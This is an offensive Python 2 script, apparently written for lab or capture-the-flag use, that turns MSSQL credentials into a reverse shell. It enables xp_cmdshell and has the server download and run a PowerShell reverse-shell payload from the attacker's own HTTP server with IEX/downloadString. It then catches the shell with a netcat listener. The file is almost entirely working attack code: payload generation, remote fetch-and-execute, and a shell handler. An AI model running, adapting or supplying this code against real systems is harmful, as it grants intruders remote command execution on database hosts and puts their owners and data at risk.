#!/usr/bin/env python2
#  -*- coding: utf-8 -*- #######################################################################################################
#█▀▄▀█    ▄▄▄▄▄    ▄▄▄▄▄    ▄▄ █ █         ▄  █ ▄▄  ▄█▄    █▀▄▀█ ██▄      ▄▄▄▄▄    ▄  █ ▄███▄   █    █    █▄▄▄▄ ▄█▄    ▄███▄   #
#█ █ █   █     ▀▄ █     ▀▄ █   █ █     ▀▄   █ █   █ █▀ ▀▄  █ █ █ █  █    █     ▀▄ █   █ █▀   ▀  █    █    █  ▄▀ █▀ ▀▄  █▀   ▀  #
#█ ▄ █ ▄  ▀▀▀▀▄ ▄  ▀▀▀▀▄    ▀▀▀█ █       █ ▀  █▀▀▀  █   ▀  █ ▄ █ █   █ ▄  ▀▀▀▀▄   ██▀▀█ ██▄▄    █    █    █▀▀▌  █   ▀  ██▄▄    #
#█   █  ▀▄▄▄▄▀   ▀▄▄▄▄▀        █ ███▄   ▄ █   █     █▄  ▄▀ █   █ █  █   ▀▄▄▄▄▀    █   █ █▄   ▄▀ ███▄ ███▄ █  █  █▄  ▄▀ █▄   ▄▀ #
#█                           █    ▀ █   ▀▄  █    ▀███▀     █  ███▀                █  ▀███▀       ▀    ▀  █   ▀███▀  ▀███▀      #
#▀                             ▀      ▀       ▀            ▀                      ▀                      ▀                     #
#                                                                                                                              #
# DATE                                                                                                                         #
# 17/07/2018                                                                                                                   #
#                                                                                                                              #
# DESCRIPTION                                                                                                                  #
# This code makes a reverse_tcp connection by execute commands through xp_cmdshell on a mssql server                           #
#                                                                                                                              #
# nighter - http://nighter.se/                                                                                                 #
#                                                                                                                              #
################################################################################################################################

import SimpleHTTPServer
import SocketServer
import signal
import os
import sys
import time
import _mssql

from multiprocessing import Process

# Handler to exist cleanly on ctrl+C
def signal_handler(signal, frame):
    print "\nYou pressed Ctrl+C!"
    sys.exit()
signal.signal(signal.SIGINT, signal_handler)


def build_windows_payload():

    payload = '''function Invoke-PowerShellTcp 
{ 
    [CmdletBinding(DefaultParameterSetName="reverse")] Param(

        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
        [String]
        $IPAddress,
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
        [Int]
        $Port,
        [Parameter(ParameterSetName="reverse")]
        [Switch]
        $Reverse,
        [Parameter(ParameterSetName="bind")]
        [Switch]
        $Bind
    )

    try 
    {
        #Connect back if the reverse switch is used.
        if ($Reverse)
        {
            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
        }

        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535|%{0}

        #Send back current username and computername
        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
        $stream.Write($sendbytes,0,$sendbytes.Length)

        #Show an interactive PowerShell prompt
        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
        $stream.Write($sendbytes,0,$sendbytes.Length)

        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
        {
            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
            $data = $EncodedText.GetString($bytes,0, $i)
            try
            {
                #Execute the command on the target.
                $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
            }
            catch
            {
                Write-Warning "Something went wrong with execution of command on the target." 
                Write-Error $_
            }
            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
            $x = ($error[0] | Out-String)
            $error.clear()
            $sendback2 = $sendback2 + $x

            #Return the results
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()  
        }
        $client.Close()
        if ($listener)
        {
            $listener.Stop()
        }
    }
    catch
    {
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
        Write-Error $_
    }
}
'''
    payload += '''Invoke-PowerShellTcp -Reverse -IPAddress %s -Port %s''' % (LHOST, LPORT)

    with open('/tmp/shell.ps1', 'w') as f:
        f.write(payload)


def HttpListener():

    os.chdir('/tmp')
    HTTP_PORT = 8000
    Handler = SimpleHTTPServer.SimpleHTTPRequestHandler
    httpd = SocketServer.TCPServer(("", HTTP_PORT), Handler)
    print("[+] HTTP Listen = %s" % HTTP_PORT)
    httpd.serve_forever()


def exploit():
    time.sleep(5)

    mssql = None
    try:
        mssql = _mssql.connect(server=HOST, user=USERNAME, password=PASSWORD)
        print("[+] Successful login at mssql server %s with username %s and password %s" % (HOST, USERNAME, PASSWORD))
        print("[+] Enabling 'xp_cmdshell'")
        mssql.execute_query("EXEC sp_configure 'show advanced options', 1;RECONFIGURE;exec SP_CONFIGURE 'xp_cmdshell', 1;RECONFIGURE -- ")
        cmd = '''powershell "IEX(New-Object Net.WebClient).downloadString("""http://%s:8000/shell.ps1""")"''' % LHOST
        mssql.execute_query("EXEC xp_cmdshell '%s'" % cmd)

    except Exception as e:
        print("[-] MSSQL failed: " + str(e))
    finally:
        if mssql:
            mssql.close()

if __name__ == '__main__':

    if len(sys.argv) != 6:
        print ("""
• ▌ ▄ ·. .▄▄ · .▄▄ · .▄▄▄  ▄▄▌  ▐▄• ▄  ▄▄▄· ▄▄· • ▌ ▄ ·. ·▄▄▄▄  .▄▄ ·  ▄ .▄▄▄▄ .▄▄▌  ▄▄▌  ▄▄▄   ▄▄· ▄▄▄ .
·██ ▐███▪▐█ ▀. ▐█ ▀. ▐▀•▀█ ██•   █▌█▌▪▐█ ▄█▐█ ▌▪·██ ▐███▪██▪ ██ ▐█ ▀. ██▪▐█▀▄.▀·██•  ██•  ▀▄ █·▐█ ▌▪▀▄.▀·
▐█ ▌▐▌▐█·▄▀▀▀█▄▄▀▀▀█▄█▌·.█▌██▪   ·██·  ██▀·██ ▄▄▐█ ▌▐▌▐█·▐█· ▐█▌▄▀▀▀█▄██▀▐█▐▀▀▪▄██▪  ██▪  ▐▀▀▄ ██ ▄▄▐▀▀▪▄
██ ██▌▐█▌▐█▄▪▐█▐█▄▪▐█▐█▪▄█·▐█▌▐▌▪▐█·█▌▐█▪·•▐███▌██ ██▌▐█▌██. ██ ▐█▄▪▐███▌▐▀▐█▄▄▌▐█▌▐▌▐█▌▐▌▐█•█▌▐███▌▐█▄▄▌
▀▀  █▪▀▀▀ ▀▀▀▀  ▀▀▀▀ ·▀▀█. .▀▀▀ •▀▀ ▀▀.▀   ·▀▀▀ ▀▀  █▪▀▀▀▀▀▀▀▀•  ▀▀▀▀ ▀▀▀ · ▀▀▀ .▀▀▀ .▀▀▀ .▀  ▀·▀▀▀  ▀▀▀ 
    """)
        print("Usage: %s <HOST> <LHOST> <LPORT> <USERNAME> <PASSWORD>" % (sys.argv[0]))
        print("\nEXAMPLE: ./mssql_xpcmdshell_rce.py 10.10.10.59 10.10.14.24 1337 <USERNAME> <PASSWORD>\n")
        sys.exit(0)

    HOST = sys.argv[1]
    LHOST = sys.argv[2]
    LPORT = sys.argv[3]
    USERNAME = sys.argv[4]
    PASSWORD = sys.argv[5]

    print("[+] LHOST = %s" % LHOST)

    build_windows_payload()

    # Serve payload
    p = Process(target=HttpListener)
    p.start()

    # Exploit windows
    p = Process(target=exploit)
    p.start()

    print "[+] Netcat = %s" % LPORT
    os.system('nc -lnvp %s' % LPORT)